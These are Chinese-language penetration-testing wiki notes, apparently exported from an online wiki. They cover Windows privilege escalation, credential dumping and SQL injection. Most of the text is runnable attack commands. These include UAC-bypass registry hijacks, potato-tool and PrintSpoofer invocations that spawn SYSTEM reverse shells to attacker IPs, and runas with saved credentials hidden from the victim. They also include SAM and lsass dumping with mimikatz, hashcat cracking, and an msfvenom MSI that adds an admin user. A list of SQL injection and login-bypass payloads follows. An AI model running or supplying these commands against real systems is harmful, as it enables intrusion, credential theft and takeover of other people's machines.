1.白名单什么是UAC白名单？操作系统自己有一些进程在运行的时候不需要通过验证就直接可以运行，这些程序在UAC白名单中，比如：slui.exe.taskmgr.exe等。 当这些程序运行的时候可以通过DLL劫持，DLL注入或者注册表劫持等 绕过DLL去执行我们的恶意程序。 这里举例注册表劫持： 首先使用工具找出白名单的程序。在UAC白名单中的程序都有一个特点，就是Mainfest数据中的autoElevate属性的值为True。 strings.exe 可以检测程序是否有autoElevate 属性，从而找出白名单的程序： strings.exe /accepteula -s C:\\windows\\system32\\*.exe | findstr /i aotoElevate 假如ComputerDefaults.exe 进程： 打开这个exe,没有验证直接进入默认应用界面。 通过进程监控 分析该进程会发现，它会先去访问HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command，发现没东西后再去访问 HKCR\\ms-settings\\Shell\\Open\\Command\\DelegateExecute. 然后我们就可以劫持HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command 中的默认值和 DelegateExecute reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\windows\\system32\\cmd.exe #可以是攻击载荷的路径。reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d C:\\windows\\system32\\cmd.exe 2.DDL劫持什么是DLL劫持，程序通常并不是一个完整的可执行文件，被分割成一些DLL文件。当应用程序加载DLL时，如果没有指定DLL的绝对路径，那么程序就会以特定的顺序去遍历搜索加载的DLL，如果将同名的恶意的DLL文件放在真正的DLL之前，那么就会被劫持。这就是劫持。 但是这前提是这个遍历目录可写。这个目录通常又不可写。所以这个技术通常和模拟可信任技术来配合使用。 所以提出下面这个 模拟可信任目录 3.模拟可信任目录之前说了UAC白名单中的程序的manifest 数据中的autoElevate为true，当执行的时候，不但要检查这个条件，还要检查这个程序是否在可信任目录C：\\windows\\system32中。两者缺一不可。但是当系统在检查可信任目录时，会自动去除路径中的空格。比如 ”C:\\Windows \\system32” 会被解析成 “C:\\windows\\system32” 那么我们就可以创建一个”C:\\Windows \\system32”目录，把白名单中的程序复制进这个含空格的目录中。再把恶意DLL文件放到这个模拟的可信任目录中。然后运行这个模拟目录中的可执行程序。就会达到绕过UAC DLL劫持提权的效果。 md \\\\?\\C:\\Windows md \\\\?\\C:\\Windows \\System32copy C:\\Windows\\System32\\winSTA.exe C:\\Windows \\System32\\winSAT.exe 但是制作DLL的时候，要注意恶意DLL的导出函数要与被劫持的DLL一样。 专业名词解释：DelegateExecute 是 Windows 操作系统中的一个 COM (Component Object Model) 接口，它通常与应用程序扩展和外部处理程序相关。DelegateExecute 接口允许一个应用程序或组件将某些任务委托给其他程序或处理程序来执行，通常是为了增强功能或实现某种定制化的行为。 Manifest 数据指的是一个应用程序清单（Application Manifest），它是一个用于描述应用程序特性、依赖关系、权限要求以及其他元数据的 XML 文件。应用程序清单通常附加到应用程序的可执行文件（如 .exe 文件）或动态链接库（DLL）中，以便操作系统和其他程序能够正确地识别和与应用程序互动。 4.MSF下的Bypassexploitwindowslocalask #弹出UAC确认窗口，点击后获得system权限 exploitwindowslocalbypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。 exploitwindowslocalbypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 exploitwindowslocalbypassuac_fodhelper exploitwindowslocalbypassuac_eventvwr exploitwindowslocalbypassuac_comhijack 令牌窃取什么是令牌 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。 可以通过操作一个高权限进程的访问令牌来 当做一个进程的令牌。就是说偷其他进程的令牌来用。然后就可以拥有那个令牌自身拥有的权限。 能偷其他进程的访问令牌的条件：该用户必须有SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilegeSeIncreaseQuotaPrivilege权限。而这两个权限的用户通常是系统管理员账户，web服务账户，和IIs MsSQL账户等。 1.直接偷****使用incognnito.exe。上传到主机。 incognito.exe list_tokens -u #列举当前主机上的所有访问令牌incognito.exe execute -c NT AUTHORITY\\SYSTEM whoami#-c 偷令牌，whoami 偷完后执行的命令incognito.exe execute -c travel-me\\Bob cmd偷域下Bob的令牌，然后执行它的。也就是切换到Bob的用户。 2.MSF偷#msf 拿到一个会话 use incognito #进入incognito模块 list_tokens -u #列出令牌 Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问) Impresonation Token：模拟令牌，它是非交互的会话。 这里窃取令牌，主要是窃取进程中的令牌 #使用令牌假冒用户 impresonate_Token “令牌名” incognito：exemsf均可，msf中的incognito是从windows中的exe文件中移植过去的，这里以msf自带的incognito为例。 首先我们进入之前获取的meterpreter msf5 session 3 meterpreter load incognito 加载incognito（除了incognito外还可以加载其他插件比如mimikatz，我们之后会用到） meterpreter getuid 查看当前token meterpreter list_tokens -u 列出可用token meterpreter impersonate_token “NT AUTHORITY\\SYSTEM”token窃取，格式为impersonate_token”主机名\\用户名” meterpreter getuid 查看当前token meterpreter rev2self 返回之前的token 3.Potato提权Hot PotatoJuicy Potato.什么是 BITS 和 CLSID？ CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。 程序员和系统管理员使用后台智能传输服务 (BITS)从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到 HTTP Web 服务器和 SMB 文件共享。关键是BIT实现了IMarshal接口并允许代理声明强制 NTLM 身份验证。 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md(CLSID) whoami all whoami priv 如果开启SeImpersonate权限，juicypotato的参数可以使用 -t t 如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用 -t u 如果均开启，可以选择-t * 如果均未开启，那么无法提权 这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。 一个有效的 CLSID 这是实际操作中最具挑战性的部分。你需要为特定特定版本的 Windows 系统找到一个可用的 CLSID。 Juicy Potato 发布时附带了一个 CLSID.list.list` 文件，其中列出了在各种 Windows 版本中测试过的 CLSID。 你必须根据目标系统的版本，从这个列表中挑选出一个或多个 CLSID进行尝试。 例如： Windows 10 Server 20162019 常用的 CLSID 可能与 Windows 7 Server 2008 不同。 一个历史上广泛使用的 CLSID 是 {4991d34b-80a1-4291-83b6-3328366b9097} (BITS服务)。 系统未打补丁或配置未被强化 微软通过后续的更新对这类滥用 COM 权限的行为进行了限制（尽管没有完全封堵）。 某些安全软件或组策略可能会阻止未经授权的 COM 激活。 利用流程与参数对应关系当你运行 Juicy Potato 时，这些前提条件直接体现在命令行参数上： # 一个典型的 Juicy Potato 命令示例JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c CLSID -c {CLSID}: 对应前提 #2 和 #和 #4。你需要在这里填入一个在目标系统上可用的 CLSID。 **-t ***: 对应前提 #1。-t * 表示工具会自动尝试使用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege。 -l 1337: 对应前提 #3。指定一个本地监听端口。 -l port 参数只是告诉 Juicy Potato 工具：”请在内部使用这个端口来完成权限欺骗过程”。所有的监听、通信、令牌窃取都是工具自动完成的，您只需要坐在当前的shell窗口中等待新的 SYSTEM 权限的 cmd.exe 进程启动即可。 在你决定使用 Juicy Potato 之前，请按此清单检查： 权限检查：运行 whoami /priv，确认输出中 已启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege。 系统识别：确定目标机器的 Windows 版本（如 Win10, Server 2012 R2等）。 CLSID 准备：根据目标系统版本，从 CLSID.list 中挑选几个可能的候选。 执行尝试：使用类似下面的命令进行尝试，如果失败，更换 CLSID 再次尝试。 第一次尝试，使用一个针对你目标系统版本的 CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} 如果失败，尝试另一个 CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} Rotten Potato(烂土豆)此技术不适用于 Windows 10 1809 和 Windows Server 2019 的版本 1.通过NT AUTHORITY/SYSTEM运行的RPC将尝试通过CoGetInstanceFromIStorage API调用向我们的本地代理进行身份验证2.135 端口的RPC将用于回复第一个RPC正在执行的所有请求充当模板3.AcceptSecurityContextAPI调用以在本地模拟NT AUTHORITY/SYSTEM 1. 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口2. RPC 向代理发送 NTLM 协商包3. 代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证注:此包被修改为强制本地身份验证.4. 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复6. 将两个数据包的内容混合以匹配本地协商并转发到RPC7. RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟(9.) Rogue Patato 攻击机准备（Kali 或任意你控制的 Linux）\\ 1.1 先把 135 端口抢过来，做转发器 sudo socat tcp-listen:135,reuseaddr,fork tcp:靶机IP:9999 1.2 再起一个 nc 等会接收 SYSTEM 反向 Shell nc -nvlp 443 把文件丢到靶机同一目录（这里用 C:\\temp） RoguePotato.exe （GitHub 直接下 Release 即可 ） nc64.exe （反连载体，可换成 msfps 等 payload） 靶机一次执行 C:\\temp\\RoguePotato.exe -r 攻击机IP -l 9999 -e C:\\temp c64.exe 攻击机IP 443 -e cmd.exe 参数解释 -r 攻击机 IP（socat 所在） -l 9999 本地假 OXID 解析器监听端口，必须和 socat 转发对应 -e 提权成功后以 SYSTEM 身份启动的命令（这里给 nc 反向 shell） SweetPotato GodPotato利用程序内置的 Clsid 进行权限提升，并执行一个简单的命令。 GodPotato -cmd cmd /c whoami 执行反向 shell 命令 GodPotato -cmd nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012 PrintSpoofer您可以使用该选项查看帮助信息-h。 C:\\TOOLSPrintSpoofer.exe -hPrintSpoofer v0.1 (by @itm4n) Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()Arguments: -c CMD Execute the command *CMD* -i Interact with the new process in the current command prompt (default is non-interactive) -d ID Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta) -h Thats me :)Examples: - Run PowerShell as SYSTEM in the current console PrintSpoofer.exe -i -c powershell.exe - Spawn a SYSTEM command prompt on the desktop of the session 1 PrintSpoofer.exe -d 1 -c cmd.exe - Get a SYSTEM reverse shell PrintSpoofer.exe -c c:\\Temp c.exe 10.10.13.37 1337 -e cmd 用法 1：启动一个 SYSTEM 进程并与之交互如果你有交互式shell，你可以在当前控制台中创建一个新的 SYSTEM 进程。 使用场景：绑定 shell、反向 shellpsexec.py等。 C:\\TOOLSPrintSpoofer.exe -i -c cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OKMicrosoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system 用法 2：生成一个 SYSTEM 进程并退出如果你可以执行命令但没有交互式 shell，你可以创建一个新的 SYSTEM 进程，然后立即退出而不与之交互。 使用场景：WinRM、WebShellwmiexec.py等smbexec.py。 创建反向 shell： C:\\TOOLSPrintSpoofer.exe -c C:\\TOOLS c.exe 10.10.13.37 1337 -e cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK Netcat 监听器： C:\\TOOLSnc.exe -l -p 1337Microsoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system 用法 3：在桌面上启动 SYSTEM 进程如果您已本地登录或通过 RDP（包括 VDI）登录，则可以在桌面上启动 SYSTEM 命令提示符。首先，使用命令检查您的会话 ID qwinsta，然后使用选项指定此值-d。 使用场景：终端会话（RDP）、VDI C:\\TOOLSqwinsta SESSIONNAME USERNAME ID STATE TYPE DEVICE services 0 Disc console Administrator 1 Activerdp-tcp#3 lab-user 3 Active rdp-tcp 65536 ListenC:\\TOOLSPrintSpoofer.exe -d 3 -c powershell -ep bypass[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK 密码管理员也会重复使用密码，或将其密码保留在一些可读位置的系统上。 注册表大量程序在Windows注册表中存储配置选项。Windows 本身有时会在注册处以纯文本存储密码。 搜索注册表处的密码(手工winPEAS)reg query HKLM /f password /t REG_SZ /s #本地机器注册表项reg query HKCU /f password /t REG_SZ /s #当前用户注册表项 单单第一条命令进行的 HKLM 的搜索，就看到显示有 293 个匹配，而这 293 条结果中还有很多无用的数据有待认为判断处理。可以看出，这种广泛搜索极其的耗费精力！ 相反，我们可以集中精力去查看包含密码的已知注册表项。这样的注册表项是 winlogon，它与 Windows 中被称为 Autologon（自动登录）的功能相关。 reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 除了 Windows 自动登录功能外，某些程序和第三方软件也可能会以不安全的方式在注册表中存储凭据，这些第三方软件的注册表路径如下 reg query “HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP” reg query “HKCU\\Software\\SimonTatham\\PuTTY\\Sessions” reg query “HKCU\\Software\\ORL\\WinVNC3\\Password” reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 v password .\\winPEASany.exe quiet filesinfo userinfo 凭证.\\winPEASany.exe quiet cmd windowscreds 可以使用以下命令查看存储的凭据： cmdkey /list 可以看到，本地管理员账户的凭证已经存储在凭证管理器中，因此可以使用该身份借助 runas 命令去执行命令啦。 凭证管理器的枚举，对于 PowerUp 和 winPEAS 来说都不能够帮到我们，因此，凭证管理器的枚举需要我们手动进行。【PEAS 虽然支持枚举存储的凭证，但使用效果不佳，总是失败。】 虽然这并非真正的“密码搜寻”，但由于用户的密码被保存，而它确实可以为我们提供以其它用户身份运行命令的能力。因此，这实际上等同于在系统中查找某个用户的凭据。 如果尝试运行任意命令（例如“whoami”）时，我们需要将输出内容重定向到文件以读取它。这是因为 runas 会在另外新起的窗口中去执行命令，命令执行结束新起的窗口就被关闭了，因此输出的内容并不会呈现在当前的 shell 窗口中。 runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator cmd.exe /c whoami C:\\temp\\whoami.txt 从上面可以看到，我们确实是以本地管理员帐户的身份运行了 whoami 命令！接下来，就可以使用 runas 来借助 nc.exe 工具来获取反向 shell，命令如下： runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator c:\\temp c.exe 172.16.1.30 443 -e cmd.exe 值得一提的是，这可能会在受害者机器上打开 cmd 窗口，导致用户可以轻松关闭它。为此，我们可以使用 PowerShell 从隐藏窗口执行命令，从而增加隐蔽性。这样，受害者那边就不会打开任何窗口，也就不会那么轻松的就杀死我们的 shell。 runas /env /noprofile /savecred /user:JUGG-efrost\\administrator powershell.exe -w hidden -c c:\\temp c.exe 172.16.1.30 443 -e cmd.exe 此外，如果我们拥有对受害者机器的远程桌面权限，那么便不需要像上面那么麻烦，只需使用以下命令即可。 runas /env /noprofile /savecred /user:JUGG-efrost\\administrator cmd 配置文件搜索配置文件常见配置文件位置 C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml（常见） C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.xml C:\\Windows\\system32\\sysprep\\sysprep.xml 递归式搜索当前目录中以pass为名的文件，或以.config结尾： dir /s *pass* == *.config 递归式搜索当前目录中包含”password”一词的文件，最后也以任何一个.xml，.ini，.txt findstr /si password *.xml *.ini *.txt .\\winPEASany.exe quiet cmd searchfast filesinfo 或者PowerUp 知道密码后，可以用winexe反弹shell SAMWindows系统下的hash密码格式用户名称:RID:LM-HASH值:NT-HASH值 例如： Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4::: 用户名称为：Administrator RID为：500 LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE NT-HASH值为：32ED87BDB5FDC5E9CBA88547376818D4 通过SAM文件+mimikatz读取密码windows的用户hash一般是存储在C:\\windows\\system32\\config\\SAM文件中（域控存在NTDS.dit文件中），只不过，就算是管理员权限，也是无法正常打开并读取文件内容，因此一般无法直接通过SAM文件获取用户hash。 reg save hklm\\sam C:\\hash\\sam.hive reg save hklm\\system C:\\hash\\system.hive 将上述获得的sys.hiv和sam.hiv文件复制到mimikatz所在文件夹，运行mimikatz， 输入lsadump::sam /system:sys.hiv /sam:sam.hiv，即可导出所有用户密码hash 下载信用套件：git clone https://github.com/Neohapsis/creddump7.git 运行对SAM和系统文件的工具来提取哈希：python2 creddump7/pwdump.py SYSTEM SAM 使用hashcat破解管理员用户哈希：hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt 在 Windows 运行时，文件已锁定。文件的备份可能存在于C:\\Windows\\Repair or C:\\Windows\\System32\\config\\RegBack directories lsass.exe 进程lsass.exe是一个系统进程，用于本地安全认证，用户的hash信息就存在lsass.exe程序内存中。我们一般就是以lsass.exe进程为目标，使用工具从该进程中dump出已登录用户的hash相关信息 但可以通过注册表导出sam和system文件 procdump64(微软自己的工具)+mimikatzprocdump64.exe -accepteula -ma lsass.exe lsass.dmp 使用本地的mimikatz.exe读取lsass.dmp Scheduled Tasks查看计算机上以管理权限运行的计划任务。schtasks /query /fo LIST /vschtasks /query /fo list /v schtasks.txtschtasks /query /fo LIST /v | findstr 管理员schtasks /query /fo LIST /v | findstr Snipaste 使用AccessChk查看指定目录的权限配置情况。如果我们对以高权限运行的任务所在目录具有写入权限，就可以使用恶意程序覆盖掉原来的程序。 accesschk -dqv C:/Program Files/Snipaste-1.16.2-x86 -accepteula 具有写入权限，将恶意程序放入对应目录下。 执行重启命令。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。成功提权后记得修改回配置。 shutdown -r -t 0 在Windows中可以利用计划任务覆盖原有的程序来进行替换\\ 可以使用如下命令查看计算机上的计划任务。\\ schtasks /query /fo LIST /v 使用如下命令可以查看指定目录的权限配置情况。如果我们对以高权限运行的任务所在目录具有写入权限，就可以使用恶意程序覆盖掉原来的程序。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。 accesschk.exe -dqv D:test -accepteula 用户权限前言在Windows中，可以为用户帐户和组分配特定的“特权”。 这些特权授予对某些能力的访问权。其中一些能力可以用来将我们的总体特权提升到系统的权限。 列出用户权限whoami /all SeImpersonatePrivilege可以使用烂土豆 SeAssignPrimaryPrivilege可以使用烂土豆 SeAssignPrimaryPrivilege可以使用烂土豆 SeBackupPrivilege授予对所有对象的读取权限 在系统上，不管他们的ACL使用此权限，用户可以访问敏感的或者从注册表中提取哈希值 然后进行破解或用于传递散列攻击。 SeRestorePrivilegeSeRestorePrivilege授予对系统上所有对象的写访问权，而不管它们的ACL如何。 滥用特权的三种方式： 修改服务二进制文件 覆盖系统进程使用的DLL 修改注册表设置 SeTakeOwnershipPrivilegeSeTakeOwnershipPrivilege允许用户取得所有权，在对象上（写入所有者权限） 一旦您拥有一个对象，就可以修改它的ACL并授予你自己写访问权限 与SeRestorePrivilege使用的方法相同 其他特权(更高级) SeTcbPrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeDebugPrivilege (used by getsystem) 按系统类型 Windows20002003、XPat本地命令提权在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将 Administrators 组下的用户权限提升到 SYSTEM at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、可以是一个二进制文件。 语法：at 时间 命令例子：at 10:45PM calc.exe 该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “interactive”开启界面交互模式： 在得到一个system的cmd之后，使用 taskmgr 命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境 at 配合 msf提权msf下生成木马文件，获取会话之后，然后进入shell at命令执行运行程序， 再开个窗口监听这个端口，上线后即为system windows 78、0308、1216sc命令提权关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。 sc Create syscmd binPath= cmd /K start type= own type= interact 这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务，然后执行以下命令，就得到了一个system权限的cmd环境： sc start systcmd AlwaysInstallElevatedAlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。 可以通过查询以下注册表项来识别此设置： [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] “AlwaysInstallElevated”=dword:00000001[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] “AlwaysInstallElevated”=dword:00000001 使用reg query命令查询是否存在漏洞 C: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedorC: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 如果系统没这个漏洞，它将输出错误: ERROR: The system was unable to find the specified registry key or value. 如果存在漏洞，上面将输出以下内容: 然后我们使用msfvenom生成msi文件，进行提权 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\\programdata\\rotten.msi# /quiet 安装过程中禁止向用户发送消息# /qn 不使用GUI# /i 安装程序msf下的自动模块exploit/windows/local/always_install_elevated Unattended Installs自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。 全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中： C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ 除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。 C:\\Users\\user\\Desktop dir C:*vnc.ini /s /b /c#或者在名称中包含关键词的项目：C:\\Users\\user\\Desktop dir C:\\ /s /b /c | findstr /sr *password*#或者可以在文件内容中搜索password之类的关键字：C:\\Users\\user\\Desktopfindstr /si password *.txt | *.xml | *.ini#可以查询注册表，例如，字符串password：reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s 在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。 #msf模块post/windows/gather/enum_unattend 第三方软件漏洞提权mysqldocker 更新: 2025-11-17 11:43:05原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/owwvd1130r1klgal"},{"path":"/wiki/Web知识点/SQL注入/SQLi流程.html","content":"SQLi流程一、思路1、判断注入点在GET参数、POST参数、以及HTTP头部等，包括Cookie、Referer、XFF(X-Forwarded-for)、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。 1）、GET 注入提交数据的方式是 GET，注入点的位置在 GET 参数部分。例如有这样的一个URL：http://xxx.com/news.php?id=1，id是注入点。 2）、POST 注入使用 POST 方式提交数据，注入点位置在 POST 数据部分，通常发生在表单中。 3）、HTTP 头部注入注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中，Cookie 字段中等。 2、判断数据库类型判断网站使用的是哪个数据库，常见数据库如：MySQL、MSSQL(SQLserver)、Oracle、Access、PostgreSQL、BD2等等。 nmap 端口扫描 数据库类型 默认端口号 Oracle 1521 SQL Server 1433 MySQL 3306 PostgreSql 5432 网站类型 数据库类型 asp SQL Server，Access .net SQL Server php Mysql，PostgreSql java Oracle，Mysql 数据库类型 特有的系统表 Oracle SYS.USER_TABLES SQL Server SYSOBJECTS MySQL(MySQL版本在5.0以上) INFORMATION_SCHEMA.TABLES Access MSYSOBJECTS 2、有回显 报错查询 exp: andor exp(~(select * from (select user () ) a) ); updatexml: andor(updatexml(1,concat(0x7e,(select database()),0x7e),1)) extractvalue: extractvalue(1,concat(0x7e,version(),0x7e)) 联合查询 确定列数：union select 1,2,3# 确定回显列：比如查出来 1，2 那就在1，2上进行查询 确定数据库：union select database() ,2,3# 确定表：union select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schemadatabase()# 确定列：union select (group_concat(column_name)),2,3 from information_schema.columns where table_name’ ‘# 确定用户：union select 1,group_concat(user),3 from ‘ ‘# information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表名 基于报错bool盲注and ascii(substr(database(),1,1))115 3、无回显 基于时间bool盲注 数据库：if(ascii(substr(database(),1,1))114,1,sleep(5))# 表if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schemadatabase() LIMIT 0,1),1,1))114,1,sleep(5))#LIMIT 0,1 → 获取第一张表（如 ‘users’） LIMIT 1,1 → 获取第二张表（如 ‘products’） 4、其他 宽字节：’被转义为 %df’ 堆叠：id1’; insert into users values(‘admin’,’password’)# 更新: 2025-09-06 13:59:43原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/3efc1b0bdbfc8cfe491c229383c48ade"},{"path":"/wiki/Web知识点/SQL注入/SQL注入.html","content":"SQL注入SQL注入一、MySqL 一 、同站 判断是否有注入点 and 11 页面正常 and 12 页面异常 如果这两个都没有异常，那就试试字符集 ?id1’ 通过order by判断注入的字段数（猜一下） 页面错误与正常的临界点就是字段数 通过union 来测试 让id负数或者and12让网页报错，报错的那几个数字记住，那个数字报错就在哪里查 比如2，3报错，可以 ············union select 1，version(),database()，4 信息收集 数据库版本：version() 数据库名字：database() 数据库用户：user() 操作系统：@@version_compile_os 在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库，相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名 获取相关信息 ? id-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema’ ‘ ? id-1union select 1,group_concat(column_name),3 from information_schema.columns where table_name’ ‘ ? id-1union select 1,group_concat(user),group_concat(password) from ____ information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表ming名 二 、跨库查询 ? id-1union select 1,group_concat(schema_name),3 from information_schema.schemata 三、文件读写函数 load_file 文件读取 into outfile 或into dumpfile 文件写入 ！在注入点操作 四、int 函数判断是否为整数 $sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; echo $sql; $result=mysql_query($sql);else echo ni shi ge jj?;``` 五、参数提交注入 #简要明确参数类型数字，字符，搜索，JsoN等#简要明确请求方法GET, POST,COOKIE，REQUEST，HTTP头等其中sql语句干扰符号: ,,s,),等，具体需看写法 二、其他数据库特点一、access注入 Access数据库 1表名 2列名 3数据 access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库 access三大攻击手法 access注入攻击片段-联合查询法 access注入攻击片段-逐字猜解法 工具类的使用注入（推荐） Access注入攻击方式 union 注入、http header 注入、偏移注入等 二、msSQL注入https://www.cnblogs.com/xishaonian/p/6173644.html 三、postgresql注入https://www.cnblogs.com/KevinGeorge/p/8446874.html 四、Oracle注入https://www.cnblogs.com/peterpan0707007/p/8242119.html 五、mongoDB注入https://www.cnblogs.com/wefeng/p/11503102.html SQLmap不能识别MongoDB这里介绍nosqlattack:https://github.com/youngyangyang04/NoSQLAttack 三、 12种报错注入+万能语句1、通过floor报错,注入语句如下:and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下:and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下:and 1(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下:and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下:select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下:and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下:and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下:and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下:and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下:and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下:and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下:and linestring (()select * from(select user() )a)b ); 关于POST注入 常用的万能username语句：a ’ or 11 #a “) or 11 #a‘) or 11 #a” or “1””1‘ or ‘1’’1‘ or (length(database())) 8 (用于输入’ “都没有错误)‘ or (ascii(substr((select database()) ,1,1))) 115 # (用于输入’ “都没有错误)“) or (“1”)(“1“) or 11 or if(11, sleep(1), null) #“) or (length(database())) 8 #“) or (ascii(substr((select database()) ,1,1))) 115 or if(11, sleep(1), null) # 